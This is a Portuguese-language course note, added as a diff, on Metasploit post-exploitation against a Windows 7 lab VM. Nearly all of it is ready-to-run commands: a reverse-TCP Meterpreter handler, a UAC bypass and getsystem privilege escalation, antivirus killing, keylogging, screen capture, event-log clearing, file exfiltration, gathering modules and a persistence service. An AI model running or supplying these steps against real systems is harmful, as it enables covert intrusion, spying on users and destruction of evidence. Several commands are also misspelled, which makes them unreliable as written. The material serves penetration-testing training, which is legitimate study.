@@ -1,0 +1,221 @@
+# Pós-exploração em sistemas comprometidos
+
+## **Introdução**
+
+- Neste curso vamos falar da etapa de pós exploração e como se manter conectado ao dispositivo atacado.
+
+           **Percurso:**
+
+Etapa 1: Escalonamento de privilégios no Windows.
+
+Etapa 2: Extração de dados.
+
+Etapa 3: Módulos de pós exploração
+
+Etapa 4: Módulos de exploits para persistência.
+
+---
+
+## **Escalonamento de privilégios no Windows**:
+
+- Pós-exploração refere-se a quaisquer ações tomadas após a abertura de uma sessão.
+
+            **Pós exploração:**
+
+- Uma sessão é um shell aberto de uma exploração bem-sucedida ou ataque de força bruta, que por sua vez pode ser um shell padrão ou Meterpreter.
+
+           **Escalonamento de privilégios:**
+
+- O escalonamento de privilégios também é uma das técnicas mais comuns que os invasores usam para descobrir e infiltrar dados valiosos e confidenciais.
+- Para um hacker, o escalonamento de privilégios é a arte de aumentar os privilégios desde o acesso inicial, normalmente em usuário padrão ou conta de aplicativo, até o administrador, root ou até mesmo o acesso total ao sistema.
+
+            **Prática:**
+
+- Vamos utilizar o .exe da aula passada.
+- Vamos praticar o escalonamento de privilégios em uma VM com Windows.
+
+            **No kali linux:**
+
+- `msfconsole`
+- `use multi/handler`
+- `set payload windows/meterpreter/reverse_tcp`
+- `ip addr`   //verificar IP
+- `set lhost MEUIP`  //setar IP
+- `set lport 4444`   //setar a porta
+- `run`
+
+             **No windows 7:**
+
+- Execute o Update.exe
+
+             **No kali linux:**
+
+- `sysinfo`   //informações do computador acessado
+- `getuid`  //usuário do windows acessado
+- `getsystem`  //se torna adm
+- `getpid`    //nome do processo
+- `ps` //serviços rodando na máquina
+- `migrate 1234` [pid] //pode alterar o pid para outro executável
+
+     abrindo shell no kali, verificando privilégio com backdoor:
+
+- `shell` //abre o shell do windows-cmd
+- `whoami` //mostra o user
+- `whoami /priv`   //mostra privilégios de acesso
+- `exit`
+
+-
+
+escalonamento de privilégio com meterpreter:
+
+- Colocar sessão em background: `background`
+- verifica sessões: `sessions`
+- `search uac`
+- `use exploit/windows/local/bypassuac`
+- `show options`
+- `set playload windows/meterpreter/reverse_tcp`
+- `show targets` //mostra arquiteturas
+- `set target 0` //win7 é 32
+- `set lhost IPLOCAL`
+- `set lport 2022`
+- `set session 1`
+- `show options`  //para confirmar os dados
+- `exploit`
+- `background`
+- `sessions` [é pra ter duas, a primeira do backdoor, a segunda do meterpreter] no backdoor, conseguimos acesso a maquina, no meterpreter, conseguimos privilégio de acesso.
+- `sessions` [sessão do meterpreter]
+- `getuid` //verifica o id
+- `getsytem` //escalona de privilégio
+- `shell`, `whoami`, `whoami /priv`  → para verificar o privilégio alcançado
+
+---
+
+## Extração de dados com Metasploit
+
+- Vamos utilizar o Meterpreter, ferramenta disponibilizada no framework Metasploit.
+
+Na prática:
+
+   No Kali Linux:
+
+- `msfconsole`
+- `use multi/handler`
+- `set payload windows/meterpreter/reverse_tcp`
+- `set LHOST IPLOCAL`
+- `set LPORT 4444`
+- `run`
+- `run killav` ,  `run post/windows/manage/killav`  → Desativar antivírus
+- `run vnc` → consegue ver a tela do computador alvo.
+- `screenshare` → visualiza tela remota pelo navegador.
+- `keyscan_star`  `keyscan_dump`  `keyscan_stop` → Registra o que o usuário digita.
+- `clearev`  → limpa logs
+- `backgorund`
+- `sessions 4`
+
+No windows 7
+
+- Criar um arquivo teste em txt.
+
+No kali linux:
+
+- `search -d C:/Users -f *.txt`
+- `download -h`
+- `download DIRETORIO DO ARQUIVO`
+- `upload -h`
+- `upload CAMINHODOARQUIVO CAMINHODESTINO`
+
+---
+
+## Módulos de pós exploração:
+
+Tipos de módulos:
+
+- Extract credentials
+- Privilege escalation modules
+- Information gathering
+- Spy /Capture
+
+Na prática:
+
+           No Kali linux:
+
+       migrar automaticamente para outro pid
+
+- `background`
+- `session`
+- `use post/windows/manage/migrate`
+- `show options`
+- `set session 1`
+- `run`
+
+        verificar se é uma máquina virtual
+
+- `use post/windows/gather/checkvm`
+- `set session`
+- `run`
+
+        verifica as pastas compartilhadas
+
+- `use post/windows/gather/enum_shares`
+- `set session`
+- `exploit`
+
+        tudo que foi acessado na máquina pelo usuário:
+
+- `use posr/windows/gather/dumplinks`
+- `set session`
+- `run`
+
+Utilizando scripts para automatizações:
+
+No kali
+
+- `nano meterpreter.rc`   para adicionar automações
+- dentro desse arquivo, deve adicionar:
+
+`use exploit/multi/handler`
+
+`set payload windows/meterpreter/reverse_tcp`
+
+`set lhost 192.167.57.103`
+
+`ser lport 4444`
+
+`exploit -z`   [-z joga para background] 
+
+- `msfconsole -r meterpreter.rc`
+- `sessions`
+- `sysinfo`
+
+---
+
+## Persistência de sessão no Metasploit:
+
+- Nesta aula vamos aprender a manter uma conexão com a máquina alvo, mesmo após a reinicialização.
+
+Persistência de sessão:
+
+- O metasploit tem um script chamado persistence que pode nos permitir configurar um meterpreter (ouvinte) persistente no sistema da vítima.
+- Vamos utilizar os módulos de persistência do Metasploit e Meterpreter.
+
+      Na prática:
+
+            No Kali Linux:
+
+- `msfconsole`
+- `use exploit/multi/handler`
+- `set payload windows/meterpreter/reverse_tcp`
+- `set lhost IPMAQUINALOCAL`
+- `set lport 4444`
+- `exploit`
+- `background`
+
+agora, vamos utilizar o módulo de persistência:
+
+- `use exploit/windows/local/persistence_service`
+- `show options`  //para validar o que falta preencher
+- `sessions`
+- `set session [numero da versao]`
+- `set lhost IPMAQUINALOCAL`
+- `lport 2022`
+- `exploit`
